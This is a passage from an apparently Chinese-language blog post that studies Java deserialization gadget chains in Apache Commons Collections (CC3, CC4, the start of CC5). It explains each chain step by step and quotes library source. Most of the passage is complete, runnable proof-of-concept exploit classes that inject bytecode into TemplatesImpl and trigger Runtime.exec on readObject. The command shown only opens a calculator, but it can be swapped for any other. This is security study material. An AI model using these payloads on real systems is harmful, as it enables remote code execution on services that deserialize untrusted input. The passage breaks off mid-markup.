java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下 PriorityQueue#siftDown</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后用到PriorityQueue#siftDownUsingComparator</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最重要的参数就是 comparator,可控即可RCE.<br>接下来我们的任务是如何调用 TemplatesImpl#newTransformer 以及如何与readObject 结合</p><p>回顾 InvokerTransformer，调用其 transform 方法，如果可控 transform 方法中参数，以及 this.iMethodName 即可调用任意类的任意方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> O <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>cc3更像是cc1+cc2的结合体  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComCol3</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"TestDemo"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"TestDemo"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer[] realPoc = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;</span><br><span class="line">        ChainedTransformer fakeChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="string">"random"</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Class clz = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>);</span><br><span class="line">        Constructor construct = clz.getDeclaredConstructor(Map<span class="class">.<span class="keyword">class</span>, <span class="title">Transformer</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, fakeChain);</span><br><span class="line">        Constructor handler_construct = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handler_construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_construct.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapDemo</span>)</span>;</span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;, <span class="title">map_handler</span>)</span>;</span><br><span class="line">        Constructor AnnotationInvocationHandler_Construct = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        AnnotationInvocationHandler_Construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Construct.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">proxy_map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">newInstance()</span><br><span class="line">TrAXFilter#TrAXFilter()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses</span><br><span class="line">newInstance()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>先看一下 InstantiateTransformer#transform，就是通过反射调用构造函数来实例化对象 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> + (input == <span class="keyword">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>CC3 用到了 TrAXFilter 这个类，其构造方法会调用 templates.newTransformer()，且 templates 可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">      TransformerConfigurationException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      _templates = templates;</span><br><span class="line">      _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">      _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">      _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><p>测试环境 </p><ul><li>jdk1.7</li><li>Commons Collections 4.0<br>cc4也没什么新的东西，实际上算是cc2和cc3的杂交体。。</li></ul><p>cc3前半段用的是cc1的，在cc4里稍微改了一下，前半段换成cc2的了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">PriorityQueue.heapify()</span><br><span class="line">PriorityQueue.siftDown()</span><br><span class="line">PriorityQueue.siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">newInstance()</span><br><span class="line">TrAXFilter#TrAXFilter()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses</span><br><span class="line">newInstance()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComCol4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Cat"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>; <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>).getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field queue_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc4"</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc4"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h1><p>适用版本：3.1-3.2.1，JDK 1.8  </p><p>利用链：   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 